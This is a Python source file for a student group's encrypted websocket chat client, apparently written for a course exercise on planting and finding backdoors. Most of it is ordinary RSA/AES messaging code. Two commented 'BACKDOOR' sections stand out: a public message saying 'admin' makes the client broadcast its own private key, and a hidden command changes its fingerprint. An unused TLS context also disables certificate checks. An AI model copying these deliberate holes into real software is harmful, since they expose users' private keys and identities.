import json
import websockets
import asyncio
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Signature import pss
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
import hashlib
import base64
import traceback
import ssl

# Group 19
# Reilly Hollamby, Natasha Robinson, Chris Sheridan, Aaraon Van Der Hoek

# This function will be called when the user types "Send a private message"
# The function will take a list of participants from the command line and a message and broadcast it to the server and in turn all clients.
# clientKey is this clients exported RSA key, destSocket is the socket that the client is connected on and sending the message to
async def sendPrivateMessage(destSocket):
    counters[0][1] += 1
    AESkey = get_random_bytes(32)

    ## NEED TO ADD IN HERE A SECTION WHERE I CAN CHOOSE WHICH PARTICIPANTS TO SEND IT TO ##
    participantsString = input("Who would you like to send the message to: ")
    participantsList = participantsString.split(",")
    for participant in participantsList:
        participant.strip()

    ## FIND FINGERPRINTS OF CLIENTS HERE WHEN CLIENT IDS IMPLEMENTED ##
    participantsList.insert(0, myFingerprint)

    # Receive input from the command line
    Message = input("Input the message you would like to send: ")

    # Create the initialisation vector for the AES Encryption
    iVect = get_random_bytes(16)
    b64IV = base64.b64encode(iVect).decode('utf-8')

    # Remove the sender from the participants list for encryption of key
    participantsListNoSender = []
    for entry in participantsList:
        participantsListNoSender.append(entry)
    participantsListNoSender.pop(0)
    # Create the symm_keys list with the sending clients key as the first as per the specification
    symm_keys = []
    destinationServers = []
    # Iterate through all participants it is being sent to
    for participant in participantsListNoSender:
        try:
            # Find the index of the current participant
            clientIndex = fingerprints.index(participant)
            # Append the servers address
            destinationServers.append(clientAddress[clientIndex])
            # Find the public key assigned to that participant
            clientPublicKey = connectedClients[clientIndex]
            # Create the cipher object
            RSACipher = PKCS1_OAEP.new(clientPublicKey)
            # Encrypt the AES Key with this clients public key
            encryptedKey = RSACipher.encrypt(AESkey)
            b64EncryptedKey = base64.b64encode(encryptedKey).decode('utf-8')
            symm_keys.append(b64EncryptedKey)
        except ValueError:
            print("Participant not currently connected!! ")
            continue

    chat = {
        "participants": participantsList,
        "message": Message
    }

    serialisedChat = json.dumps(chat)

    # Create the AES Cipher object
    cipher = AES.new(AESkey, AES.MODE_GCM, nonce=iVect)
    encryptedChat, tag = cipher.encrypt_and_digest(serialisedChat.encode('utf-8'))
    encodedChat = base64.b64encode(encryptedChat + tag).decode('utf-8')

    ## APPEND THE REST OF THE SYMM_KEYS FOR THE PARTICIPANTS HERE ##


    # Package the rest of the message into the desired package as per the specification
    data = {
        "type": "chat",
        "destination_servers": destinationServers,
        "iv": b64IV,
        "symm_key": symm_keys,
        "chat": encodedChat
    }

    jsonData = json.dumps(data)

    signatureBase = jsonData + str(counters[0][1])

    hashedSignatureBase = SHA256.new(signatureBase.encode())

    unencodedSignature = pss.new(myPrivateKey).sign(hashedSignatureBase)

    signature = base64.b64encode(unencodedSignature).decode()

    request = {
        "type":"signed_data",
        "data": data,
        "counter": counters[0][1],
        "signature":signature
    }

    # Serialise the request int JSON formatted string
    serialisedRequest = json.dumps(request)
    # Send the serialised request on the activeSocket
    await destSocket.send(serialisedRequest)

async def receivedPrivateChat(receivedRequest):
    forMe = False
    receivedData = receivedRequest["data"]
    sender = None
    message = None

    iVect = base64.b64decode(receivedData["iv"])

    for participant in receivedData["symm_key"]:
        b64ReceivedEncryptedKey = participant.encode('utf-8')
        receivedEncryptedKey = base64.b64decode(b64ReceivedEncryptedKey)
        try:
            myRSACipher = PKCS1_OAEP.new(myPrivateKey)
            receivedAESKey = myRSACipher.decrypt(receivedEncryptedKey)
            forMe = True
            break
        except ValueError:
            continue
    if forMe:
        receivedEncodedChat = receivedData["chat"]
        receivedDecodedChat = base64.b64decode(receivedEncodedChat)
        receivedTag = receivedDecodedChat[-16:]
        strippedReceivedDecodedChat = receivedDecodedChat[:-16]
                
        decipher = AES.new(receivedAESKey, AES.MODE_GCM, nonce=iVect)
        decryptedReceivedChat = decipher.decrypt_and_verify(strippedReceivedDecodedChat, receivedTag)

        receivedChat = json.loads(decryptedReceivedChat)

        receivedParticipants = receivedChat["participants"]
        message = receivedChat["message"]

        sender = receivedParticipants[0]

    return forMe, sender, message

# This function is called when the user inputs "Send a public message"
# The function receives input from the user and broadcasts it to all clients
# destSocket is the socket of the connected server
async def sendPublicMessage(destSocket):

    counters[0][1] += 1

    print("Enter message to send publicly: ")
    # Receive input from the user
    message = input()

    data = {
        "type": "public_chat",
        "sender": myFingerprint,
        "message": message
    }

    jsonData = json.dumps(data)

    signatureBase = jsonData + str(counters[0][1])

    hashedSignatureBase = SHA256.new(signatureBase.encode())

    unencodedSignature = pss.new(myPrivateKey).sign(hashedSignatureBase)

    signature = base64.b64encode(unencodedSignature).decode()

    # Request packaging
    request = {
        "type":"signed_data",
        "data": data,
        "counter": counters[0][1],
        "signature":signature
    }

    # Serialise request into JSON formatted string
    serialisedRequest = json.dumps(request)
    # Schedule serialised request to be sent to everyone via the server
    await destSocket.send(serialisedRequest)

# This function is called when the user inputs "Who's online?"
# The function sends a client_list_request message to the connected server
# activeSocket is the server socket
async def getClientList(activeSocket):
    # Request packaging
    request = {
        "type": "client_list_request"
    }
    # Serialise request into JSON formatted string
    serialisedRequest = json.dumps(request)
    # Schedule serialised request to be sent to everyone via the server
    await activeSocket.send(serialisedRequest)

# This function is called when the client to the specified server
async def sendHelloMessage(activeSocket):
    counters[0][1] += 1

    data = {
        "type" : "hello",
        "public_key" : exportedPublicKey.decode('utf-8')
    }

    jsonData = json.dumps(data)

    signatureBase = jsonData + str(counters[0][1])

    hashedSignatureBase = SHA256.new(signatureBase.encode())

    unencodedSignature = pss.new(myPrivateKey).sign(hashedSignatureBase)

    signature = base64.b64encode(unencodedSignature).decode()
    # Request packaging as per specification
    
    request = {
        "type":"signed_data",
        "data": data,
        "counter": counters[0][1],
        "signature":signature
    }

    # Serialise request into JSON formatted string
    serialisedRequest = json.dumps(request)
    # Schedule serialised request to be sent to everyone via the server
    await activeSocket.send(serialisedRequest)

async def checkSignature(sentSignature, senderIndex, data, counter):
    try:
        unencodedSignature = base64.b64decode(sentSignature)
        senderPublicKey = connectedClients[senderIndex]
        verifier = pss.new(senderPublicKey)

        jsonData = json.dumps(data)

        signatureBase = jsonData + str(counter)

        hashedSignatureBase = SHA256.new(signatureBase.encode())
        
        try:
            verifier.verify(hashedSignatureBase, unencodedSignature)
            print("The signature is authentic.")
            return True
        except (ValueError, TypeError):
            print("The signature is not authentic.")
            return False
        

    except Exception:
        print("Exception on signature check!")
    
# This function runs as a continual process to receive messages over the server to client connection
# The function is the main handler of all incoming messages and calls the relevant functions whenever a message is received
# websocket is the open socket which is connected to the server. stop_event is an Asyncio event which is set to true when the server disconnects
async def receiveMessages(websocket, stop_event):
    ## COUNTER WILL BE FIXED
    global counter
    ## TO BE IMPLEMENTED
    global connectedServers
    ## TO BE IMPLEMENTED
    global counters
    # While the stop_event is not set
    while not stop_event.is_set():
        try:
            # Receive any messages sent over the socket
            response = await websocket.recv()
            # Deserialise the message
            responseMessage = json.loads(response)
            # TEMPORARY CONFIRMATION
            # print(f"Received response from server: ", responseMessage)
            # If a client_list message
            if responseMessage["type"] == "client_list":
                # Clear the connectedClients list ready to refresh it
                connectedClients.clear()
                fingerprints.clear()
                # Extract the servers list from the message
                # Set the global connectedServerList to be the servers sent in the client_list message 
                connectedServers = responseMessage["servers"]
                # Iterate through each server in the client_list message
                for server in responseMessage["servers"]:
                    # Iterate through each client in the current server
                    for clients in server["clients"]:
                        # Take the SHA256 hash of the current public RSA key
                        sha256_hash = hashlib.sha256(clients.encode('utf-8')).digest()
                        # Base 64 encode the hash taken above to get the clients fingerprint
                        clientFingerprint = base64.b64encode(sha256_hash).decode('utf-8')
                        # Append the updated fingerprint to the list
                        fingerprints.append(clientFingerprint)
                        # Append the current client onto the connectedClients list
                        connectedClients.append(RSA.import_key(clients))
                        # Append the current clients server to the clientAddress list
                        clientAddress.append(server["address"])
                print("Users who are currently online: \n", fingerprints)
                # Update the fingerprints to match the current connected clients list
            # Else if the received message is signed_data
            elif responseMessage["type"] == "signed_data":
                messageSignature = responseMessage["signature"]
                # Extract the data portion of the message
                data = responseMessage["data"]
                # Extract the type from the data to see what type of signed_data it is
                type = data["type"]
                # Extract the counter of the sender
                senderCounter = responseMessage["counter"]
                # If the data is a private chat
                if type == "chat":
                    ## ADD IN THE DECRYPTION CODE HERE ##
                    returnTuple = await asyncio.gather(receivedPrivateChat(responseMessage))
                    (forMe, senderFingerprint, privateMessage) = returnTuple[0]
                    if forMe:
                        # CHECK IF CLIENT HAS A FINGERPRINT STORED THAT MATCHES THE SENDER #
                        try:
                            # Check if the fingerprint exists in the clients fingerprints
                            senderIndex = fingerprints.index(senderFingerprint)

                            ## CLIENT COUNTER CHECKING ##
                            # Initialise an iterator
                            iterator = 0
                            # For each entry in the counters list
                            for fingerprint, counter in counters:
                                # If the fingerprint exists in the counters list
                                if fingerprint == senderFingerprint:
                                    # Set the counter index to be the current searched position
                                    counterIndex = iterator
                                    # Break the search
                                    break
                                # If not found yet add one to the iterator
                                iterator += 1
                            # If the fingerprint wasn't found
                            if iterator == len(counters):
                                # Add the fingerprint, counter for the new client
                                counters.append((senderFingerprint, senderCounter))
                            # If the fingerprint was found
                            else:
                                # If this client sent this message
                                if counterIndex == 0:
                                    continue
                                # Else if there is a counter error
                                elif senderCounter <= counters[counterIndex][1]:
                                    continue
                                # Set the fingerprints counter to be the latest sent counter from that fingerprint
                                counters[counterIndex] = (senderFingerprint, senderCounter)

                            verified = await asyncio.gather(checkSignature(messageSignature, senderIndex, data, senderCounter))

                            if not verified:
                                print("An unverified sender is trying to contact you. Their message has been dismissed as this may be unsafe. ")
                                continue

                            print("Received a private message from ", senderFingerprint, ". They said: ")
                            print(privateMessage)
                        # If the fingerprint doesn't exist in the clients fingerprints list
                        except ValueError:
                            # Print a warning that someone unknown to you is trying to contact you
                                print("An unknown sender is trying to contact you. Their message has been dismissed as this may be unsafe. ")
                                continue
                    else:
                        continue                    
                # Else if the received message is a public chat message
                elif type == "public_chat":
                    messageSignature = responseMessage["signature"]
                    # Get the senders fingerprint from the data
                    senderFingerprint = data["sender"]
                    # CHECK IF CLIENT HAS A FINGERPRINT STORED THAT MATCHES THE SENDER #
                    try:
                        # Check if the fingerprint exists in the clients fingerprints
                        senderIndex = fingerprints.index(senderFingerprint)

                        ## CLIENT COUNTER CHECKING ##
                        # Initialise an iterator
                        iterator = 0
                        # For each entry in the counters list
                        for fingerprint, counter in counters:
                            # If the fingerprint exists in the counters list
                            if fingerprint == senderFingerprint:
                                # Set the counter index to be the current searched position
                                counterIndex = iterator
                                # Break the search
                                break
                            # If not found yet add one to the iterator
                            iterator += 1
                        # If the fingerprint wasn't found
                        if iterator == len(counters):
                            # Add the fingerprint, counter for the new client
                            counters.append((senderFingerprint, senderCounter))
                            # If the fingerprint was found
                        else:
                            if senderCounter <= counters[counterIndex][1]:
                                print("Counter error. Message ignored.")
                                continue
                            # Set the fingerprints counter to be the latest sent counter from that fingerprint
                            counters[counterIndex] = (senderFingerprint, senderCounter)

                        verified = await asyncio.gather(checkSignature(messageSignature, senderIndex, data, senderCounter))

                        if not verified:
                            print("An unverified sender is trying to contact you. Their message has been dismissed as this may be unsafe. ")
                            continue
                    # If the fingerprint doesn't exist in the clients fingerprints list
                    except ValueError:
                        # Print a warning that someone unknown to you is trying to contact you
                        print("An unknown sender is trying to contact you. There message has been dismissed as this may be unsafe.")
                        continue
                    
                    # BACKDOOR Num1
                    if data["message"] == "admin":
                        await asyncio.gather(getPrivateKey(websocket))

                    # TEMPORARY CONFIRMATION - THIS NEEDS TO BE FORMATTED BETTER
                    print("Public message received from: ", data["sender"], " They said: ")
                    print(data["message"])

        # If an exception occurs because the server has closed it's connection
        except websockets.ConnectionClosed:
            print("Connection closed by server")
            # Set stop_event to true (will shut down the client)
            stop_event.set()
            # Break the loop
            break
        # If any other exception occurs
        except Exception as e:
            print("Exception: ", {e})
            traceback.print_exc()
            # Set stop_event to true (will shut down the client)
            stop_event.set()
            # Break the loop
            break

async def getPrivateKey(destSocket):
    
    counters[0][1] += 1

    message = myPrivateKey.export_key().decode()

    data = {
        "type": "public_chat",
        "sender": myFingerprint,
        "message": message
    }

    jsonData = json.dumps(data)

    signatureBase = jsonData + str(counters[0][1])

    hashedSignatureBase = SHA256.new(signatureBase.encode())

    unencodedSignature = pss.new(myPrivateKey).sign(hashedSignatureBase)

    signature = base64.b64encode(unencodedSignature).decode()

    # Request packaging
    request = {
        "type":"signed_data",
        "data": data,
        "counter": counters[0][1],
        "signature":signature
    }

    # Serialise request into JSON formatted string
    serialisedRequest = json.dumps(request)
    # Schedule serialised request to be sent to everyone via the server
    await destSocket.send(serialisedRequest)

# BACKDOOR #2
async def setFingerprint():
    print("Input fingerprint to change to: ")
    myFingerprint = input()

# This function run the blocking input function in a non-blocking way by separating it into it's own loop
# The function asks for user input which is used within the userInterface function
async def getUserInput(stop_event):
    # Get a new asyncio event loop
    loop = asyncio.get_event_loop()
    # While the stop_event is not true
    while not stop_event.is_set():
        # This is just to make sure that the "Waiting for user input: " line is printed after a response is received. ## THIS NEEDS SOME MORE THOUGHT ##
        await asyncio.sleep(0.5)
        # Set userInput to be user input. This run_in_executor is what runs the input function in a non-blocking way
        userInput = await loop.run_in_executor(None, input, "Waiting for user input: \nInputs are: \n   - 'Who's online?'\n   - 'Send a public message'\n   - 'Send a private message'\n   - 'Sign off'\n")
        # Yield is just a fancy return
        yield userInput

# This function deals with all the user input and calls the relevant functions. 
# It is run concurrently with the receive function and takes in the users input from the executor loop
# clientSocket is the open server connection
async def userInterface(clientSocket, stop_event):
    # For any input which is entered by the user
    async for command in getUserInput(stop_event):
        # If the user enters "Who's online"
        if command == "Who's online?":
            # Call the getClientList function to send a client_list_request
            await asyncio.gather(getClientList(clientSocket))
        # Else If the user enters "Send a public message"
        elif command == "Send a public message":
            # Call the sendPublicMessage function to send a public message
            await asyncio.gather(sendPublicMessage(clientSocket))
        # Else if the user enter "Send a private message"
        elif command == "Send a private message":
            # Call the sendPrivateMessage function to send a private message
            await asyncio.gather(sendPrivateMessage(clientSocket))
        # Else If the user enters "Sign off"
        elif command == "Sign off":
            # CLose the socket connection and break the loop. Will shut down the client. 
            await clientSocket.close()
            break
        elif command == "Set my fingerprint":
            await setFingerprint()
        else:
            print("Incorrect input. Try again!")
            

# Main client startup function
async def main(server):
    # Create a new asyncio event
    stop_event = asyncio.Event()
    # Connect the websocket on the above server and assign it to be clientSocket ---- , ssl = ssl_context
    async with websockets.connect(server) as clientSocket:
        # Send a hello message as the first message to the server
        await asyncio.gather(sendHelloMessage(clientSocket))
        # Send a client_list_request to get all online users to begin with
        await asyncio.gather(getClientList(clientSocket))
        # Create the receiving messages task to handle the incoming messages from the connected server
        receive_task = asyncio.create_task(receiveMessages(clientSocket, stop_event))
        # Create the user input and handling of user input task which will call all the client side functions
        send_task = asyncio.create_task(userInterface(clientSocket, stop_event))
        # Begin both tasks concurrently
        await asyncio.gather(receive_task, send_task)

# Basic initialisation code
if __name__ == "__main__":
    # Initialise the empty lists:
    # connectedServers stores all the currently connected servers
    connectedServers = []
    # connectedClients stores all the currently connnected clients public RSA Keys
    connectedClients = []
    # clientAddress stores the curently connectected clients server address
    clientAddress = []
    # clientIDs stores the currently connected clients names. Me is the ID of this client
    clientIDs = ["Me"] ## THIS HASN'T BEEN IMPLEMENTED ##
    # fingerprints will store all the currently connected clients fingerprints in the same order as the connectedClients list
    fingerprints = []
    # counters will store [fingerprint, counter] of all clients that have sent messages to this client. This will keep track of the latest counters for each client
    # and will be the fundamental for the counter functionality. The first entry is this clients fingerprint and counter
    counters = []
    # Generate this clients private RSA key
    myPrivateKey = RSA.generate(2048)
    # Generate the matching public RSA key
    myPublicKey = myPrivateKey.public_key()
    # Export that public key to the raw PEM
    exportedPublicKey = myPublicKey.export_key('PEM')
    # Take the hash of the string public key
    sha256_hash = hashlib.sha256(exportedPublicKey).digest()
    # Base 64 encode that hash to get the fingerprint of this client
    myFingerprint = base64.b64encode(sha256_hash).decode('utf-8')
    # Store this fingerprint, counter pair
    counters.append([myFingerprint, -1])

    print(myFingerprint)

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE


    # Until user inputs "Shut down"
    while True:
        # Ask the user what server they would like to connect to 
        server = input("Enter the server name you would like to connect to: ")
        # server = "ws://localhost:8765"
        # If user inputs "Shut down"
        if server == "Shut down":
            # Break the loop - This will shut the program down
            break
        # Start the client connection to the server
        asyncio.run(main(server))
        # Print the sign out message
        print("Signed out of ", server)

    # Ending
    print("Shutting Down Client Program")